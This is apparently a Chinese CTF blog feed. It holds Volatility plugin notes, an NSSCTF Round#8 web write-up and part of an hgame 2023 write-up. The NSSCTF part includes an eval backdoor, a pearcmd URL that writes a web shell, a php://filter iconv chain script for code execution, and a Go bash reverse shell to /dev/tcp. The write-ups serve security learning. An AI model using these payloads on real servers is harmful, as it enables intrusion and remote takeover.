å†…å­˜æ˜ åƒä¸­å­˜åœ¨çš„ç½‘ç»œçŠ¶æ€<br>å°±åƒæ‰§è¡Œäº†netstat -ano ä¸€æ ·</p><p>windows.poolscanner.PoolScanner<br>A generic pool scanner plugin.</p><p>windows.privileges.Privs<br>Lists process token privileges</p><p>windows.pslist.PsList<br>Lists the processes present in a particular windows memory image.</p><p>windows.psscan.PsScan<br>Scans for processes present in a particular windows memory image.<br>å°±åƒåœ¨linuxä¸­æ‰§è¡Œäº†psä¸€æ ·</p><p>windows.pstree.PsTree<br>Plugin for listing processes in a tree based on their parent process ID.<br>æ ¹æ®çˆ¶è¿›ç¨‹ ID åœ¨æ ‘ä¸­åˆ—å‡ºè¿›ç¨‹çš„æ’ä»¶<br>åæ­£æˆ‘æ˜¯æ²¡æœ‰çœ‹å‡ºæ¥æ ‘å½¢ç»“æ„ä½“ç°åœ¨å“ª</p><p>windows.registry.certificates.Certificates<br>Lists the certificates in the registryâ€™s Certificate Store.<br>åˆ—å‡ºæ³¨å†Œè¡¨çš„è¯ä¹¦å­˜å‚¨ä¸­çš„è¯ä¹¦</p><p>windows.registry.hivelist.HiveList<br>Lists the registry hives present in a particular memory image.<br>åˆ—å‡ºå†…å­˜æ˜ åƒä¸­å­˜åœ¨çš„æ³¨å†Œè¡¨é…ç½®</p><p>windows.registry.hivescan.HiveScan<br>Scans for registry hives present in a particular windows memory image.<br>æ‰«æ windows ä¸­å­˜åœ¨çš„æ³¨å†Œè¡¨é…ç½®å•å…ƒ</p><p>windows.registry.printkey.PrintKey<br>Lists the registry keys under a hive or specific key value.<br>åˆ—å‡ºé…ç½®å•å…ƒæˆ–ç‰¹å®šé”®å€¼ä¸‹çš„æ³¨å†Œè¡¨é¡¹</p><p>windows.registry.userassist.UserAssist<br>Print userassist registry keys and information.<br>æ‰“å° userassist æ³¨å†Œè¡¨é¡¹å’Œä¿¡æ¯</p><p>windows.skeleton_key_check.Skeleton_Key_Check<br>Looks for signs of Skeleton Key malware<br>å¯»æ‰¾ Skeleton Key æ¶æ„è½¯ä»¶çš„è¿¹è±¡</p><p>windows.ssdt.SSDT<br>Lists the system call table.<br>åˆ—å‡ºç³»ç»Ÿè°ƒç”¨è¡¨</p><p>windows.statistics.Statistics<br>ç»Ÿè®¡æ•°æ®</p><p>windows.strings.Strings<br>Reads output from the strings command and indicates which process(es) each string belongs to.<br>è¯»å– strings å‘½ä»¤çš„è¾“å‡ºå¹¶æŒ‡ç¤ºæ¯ä¸ªå­—ç¬¦ä¸²å±äºå“ªä¸ªè¿›ç¨‹<br>å·²å°½åŠ›ï¼Œå’ã€‚</p><p>windows.svcscan.SvcScan<br>Scans for windows services.<br>æœåŠ¡æ‰«æ</p><p>windows.symlinkscan.SymlinkScan<br>Scans for links present in a particular windows memory image.<br>æ‰«æå­˜åœ¨äº Windows å†…å­˜æ˜ åƒä¸­çš„é“¾æ¥</p><p>windows.vadinfo.VadInfo<br>Lists process memory ranges.<br>åˆ—å‡ºè¿›ç¨‹å†…å­˜èŒƒå›´</p><p>windows.verinfo.VerInfo<br>Lists version information from PE files.<br>åˆ—å‡º PE æ–‡ä»¶çš„ç‰ˆæœ¬ä¿¡æ¯</p><p>windows.virtmap.VirtMap<br>Lists virtual mapped sections.<br>åˆ—å‡ºè™šæ‹Ÿæ˜ å°„section</p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><blockquote><p>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF Round#8</title>
      <link href="/2023/02/11/NSSCTF-Round-8/"/>
      <url>/2023/02/11/NSSCTF-Round-8/</url>
      
        <content type="html"><![CDATA[<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="MyDoor"><a href="#MyDoor" class="headerlink" title="MyDoor"></a>MyDoor</h4><p><a href="http://43.142.108.3:28348/index.php?file=">http://43.142.108.3:28348/index.php?file=</a><br>è¿™é‡Œåº”è¯¥æ˜¯æ–‡ä»¶è¯»å–ï¼Œç›´æ¥ã€etc/passwd æ­£å¸¸ï¼Œindex.phpæ²¡æœ‰è¯»å–åˆ°ï¼Œé‚£ä¼ªåè®®è·å–æºç <br>PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCg0KaWYgKGlzc2V0KCRfR0VUWydOX1MuUyddKSkgew0KICAgIGV2YWwoJF9HRVRbJ05fUy5TJ10pOw0KfQ0KDQppZighaXNzZXQoJF9HRVRbJ2ZpbGUnXSkpIHsNCiAgICBoZWFkZXIoJ0xvY2F0aW9uOi9pbmRleC5waHA/ZmlsZT0nKTsNCn0gZWxzZSB7DQogICAgJGZpbGUgPSAkX0dFVFsnZmlsZSddOw0KDQogICAgaWYgKCFwcmVnX21hdGNoKCcvXC5cLnxsYXxkYXRhfGlucHV0fGdsb2J8Z2xvYmFsfHZhcnxkaWN0fGdvcGhlcnxmaWxlfGh0dHB8cGhhcnxsb2NhbGhvc3R8XD98XCp8XH58emlwfDd6fGNvbXByZXNzL2lzJywgJGZpbGUpKSB7DQogICAgICAgIGluY2x1ZGUgJGZpbGU7DQogICAgfSBlbHNlIHsNCiAgICAgICAgZGllKCdlcnJvci4nKTsNCiAgICB9DQp9</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;N_S.S&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;N_S.S&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&#x27;Location:/index.php?file=&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/\.\.|la|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ç¦ç”¨äº†è®¸å¤šå‡½æ•°ï¼Œä¸Šé¢æ˜¯ä¸ªå‘½ä»¤æ‰§è¡Œï¼Œ<br>è¿™é‡ŒN_S.S å½¢å¼ç¬¬ä¸€æ¬¡è§æ˜¯åœ¨ctfshow web123</p><p>PHPå˜é‡ååº”è¯¥åªæœ‰æ•°å­—å­—æ¯ä¸‹åˆ’çº¿,åŒæ—¶GETæˆ–POSTæ–¹å¼ä¼ è¿›å»çš„å˜é‡å,ä¼šè‡ªåŠ¨å°†ç©ºæ ¼+ . [è½¬æ¢ä¸º_<br>ä½†æ˜¯æœ‰ä¸€ä¸ªç‰¹æ€§å¯ä»¥ç»•è¿‡,ä½¿å˜é‡åå‡ºç°.ä¹‹ç±»çš„<br>ç‰¹æ®Šå­—ç¬¦[, GETæˆ–POSTæ–¹å¼ä¼ å‚æ—¶,å˜é‡åä¸­çš„[ä¹Ÿä¼šè¢«æ›¿æ¢ä¸º_,ä½†å…¶åçš„å­—ç¬¦å°±ä¸ä¼šè¢«æ›¿æ¢äº†<br>å¦‚ CTF[SHOW.COM=&gt;CTF_SHOW.COM<br>ä¹Ÿå°±æ˜¯ä¼ å‚çš„æ—¶å€™<br>n_s.s &gt; n[s.s</p><p><img src="/images/Round-8/image-20230216161717020.png" alt="image-20230216161717020"></p><p>FLAG åœ¨ç¯å¢ƒå˜é‡é‡Œ</p><h4 id="MyPage-ä¸ä¼š"><a href="#MyPage-ä¸ä¼š" class="headerlink" title="MyPage ä¸ä¼š"></a>MyPage ä¸ä¼š</h4><p>å‚è€ƒ<br><code>https://blog.csdn.net/qq_61768489/article/details/129016075</code><br><code>http://v2ish1yan.top/2023/02/12/%E6%AF%94%E8%B5%9Bwp/NSSCTF%20Round8/</code><br><code>https://juejin.cn/post/7147638903191814180</code><br>é¦–å…ˆè¿˜æ˜¯æ–‡ä»¶åŒ…å«å¯ä»¥etcpasswdæ­£å¸¸ï¼Œindexã€‚phpä¸å¯ä»¥.ä¼ªåè®®phpä¹Ÿä¸å¯ä»¥</p><p>pearå·¥å…·é‡Œæœ‰ä¸€ä¸ªå‘½ä»¤å«:config-create,è¿™ä¸ªå‘½ä»¤éœ€è¦ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°æ˜¯å†™å…¥çš„æ–‡ä»¶è·¯å¾„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¼šè¢«å†™å…¥åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚<br>æˆ‘ä»¬å¯ä»¥æ„é€ url:<br>index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/<?=phpinfo()?>+/tmp/shell.php<br>å¤åˆ¶ä»£ç <br>ç„¶ååŒ…å«æˆ‘ä»¬æ–°å»ºçš„è¿™ä¸ªæ–‡ä»¶å°±OKäº†ã€‚</p><p><img src="/images/Round-8/image-20230216165541573.png" alt="image-20230216165541573"></p><p>è¿™é‡Œè¦æ³¨æ„ç¼–ç é—®é¢˜ï¼Œè¦åœ¨bpé‡å‘åŒ…å°±å¯ä»¥äº†</p><p><a href="http://43.142.108.3:28851/index.php?file=/tmp/shell.php">http://43.142.108.3:28851/index.php?file=/tmp/shell.php</a></p><p>äºŒ è¯»å–æºç  flag</p><p><a href="http://43.142.108.3:28025//index.php?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/index.php">http://43.142.108.3:28025//index.php?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/index.php</a></p><p><img src="/images/Round-8/image-20230216174510836.png" alt="image-20230216174510836"></p><p>ä¸‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.142.108.3:28025/index.php?file=&quot;</span></span><br><span class="line">file_to_use = <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">command = <span class="string">&quot;id&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line">    <span class="string">&quot;action&quot;</span>: <span class="string">&quot;include&quot;</span>,</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: final_payload</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h4 id="Upload-gogoggoUpload-gogoggo"><a href="#Upload-gogoggoUpload-gogoggo" class="headerlink" title="Upload_gogoggoUpload_gogoggo"></a>Upload_gogoggoUpload_gogoggo</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">cmd := exec.Command(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &amp;&gt; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span>)</span><br><span class="line">out, err := cmd.CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="keyword">string</span>(out))</span><br><span class="line">log.Fatalf(<span class="string">&quot;cmd.Run() failed with %s\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="keyword">string</span>(out))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>go run run.go</p><p>ä¸Šä¼ è¿™ä¸ªgoæ–‡ä»¶</p><p>nc -lvnkp</p><p><img src="/images/Round-8/image-20230216184449491.png" alt="image-20230216184449491"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ä¼ªåè®® </tag>
            
            <tag> RCE </tag>
            
            <tag> GO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023hgameéƒ¨åˆ†wp</title>
      <link href="/2023/01/06/2023hgame%E9%83%A8%E5%88%86wp/"/>
      <url>/2023/01/06/2023hgame%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="Classic-Childhood-Game"><a href="#Classic-Childhood-Game" class="headerlink" title="Classic Childhood Game"></a>Classic Childhood Game</h3><p>ç®€å•js,æˆ‘ä»¬å³é”®æºä»£ç ä¸€ä¸‹ï¼Œç¿»ä¸€ç¿»jsæ–‡ä»¶ç›´æ¥æœhgame æ²¡æœ‰ï¼Œé‚£è‚¯å®šæ—¶ç¼–ç æˆ–è€…åŠ å¯†äº†ï¼Œæ‰¾æ‰¾å¯ç–‘å­—ç¬¦ä¸²ï¼Œæ‹¿å»è§£ä¸€ä¸‹</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230106152018877.png" alt="image-20230106152018877"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function mota() &#123;</span><br><span class="line">  var a = [&#x27;\x59\x55\x64\x6b\x61\x47\x4a\x58\x56\x6a\x64\x61\x62\x46\x5a\x31\x59\x6d\x35\x73\x53\x31\x6c\x59\x57\x6d\x68\x6a\x4d\x6b\x35\x35\x59\x56\x68\x43\x4d\x45\x70\x72\x57\x6a\x46\x69\x62\x54\x55\x31\x56\x46\x52\x43\x4d\x46\x6c\x56\x59\x7a\x42\x69\x56\x31\x59\x35&#x27;];</span><br></pre></td></tr></table></figure><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230106152036326.png" alt="image-20230106152036326"></p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="Become-A-Member"><a href="#Become-A-Member" class="headerlink" title="Become A Member"></a>Become A Member</h4><p>å…¸å‹headerå¤´è¯·æ±‚ï¼Œcookieé‚£ä¸ªè¿˜æŒºéš¾æƒ³çš„emmmm</p><p>Referer: bunnybunnybunny.com<br>X-Forwarded-For: 127.0.0.1</p><p>Cookie: code=Vidar</p><p>{â€œusernameâ€:â€luckytodayâ€,â€passwordâ€:â€happy123â€}</p><figure class="highlight plaintext"><figcaption><span>/ HTTP/1.1 http</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Host: week-1.hgame.lwsec.cn:30417</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Cute-Bunny</span><br><span class="line">Referer: bunnybunnybunny.com</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: code=Vidar</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 47</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;luckytoday&quot;,&quot;password&quot;:&quot;happy123&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230106172621452.png" alt="image-20230106172621452"></p><h4 id="Guess-Who-I-Am"><a href="#Guess-Who-I-Am" class="headerlink" title="Guess Who I Am"></a>Guess Who I Am</h4><p>è¿™é¢˜æ²¡æœ‰ç”¨hintï¼Œç›´æ¥å…¨é€‰å¤åˆ¶çš„é‚£ä¸ªé¡µé¢ï¼Œç„¶å è„šæœ¬æœ‰ç‚¹éº»çƒ¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">d = &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ba1van4ba1van4</span></span><br><span class="line"><span class="string">21çº§ / ä¸ä¼šRe / ä¸ä¼šç¾å·¥ / æ´»åœ¨æ¢¦é‡Œ / å–œæ¬¢åšä¸ä¼šçš„äº‹æƒ… / â—¼â—»ç²‰</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">yolandeyolande</span></span><br><span class="line"><span class="string">21çº§ / éå¸¸èœçš„å¯†ç æ‰‹ / å¾ˆæ‡’çš„æ‘¸é±¼çˆ±å¥½è€…ï¼Œæœ‰ç‚¹å‘†ï¼Œæƒ³å­¦ç‚¹åˆ«çš„ä½†æ˜¯ä¸€ç›´å¼€æ‘†</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">t0hkat0hka</span></span><br><span class="line"><span class="string">21çº§ / æ—¥å¸¸è‡ªé—­çš„Reæ‰‹</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">h4kuy4h4kuy4</span></span><br><span class="line"><span class="string">21çº§ / èœé¸¡pwnæ‰‹ / åˆèœåˆçˆ±æ‘†</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.......</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s1 = 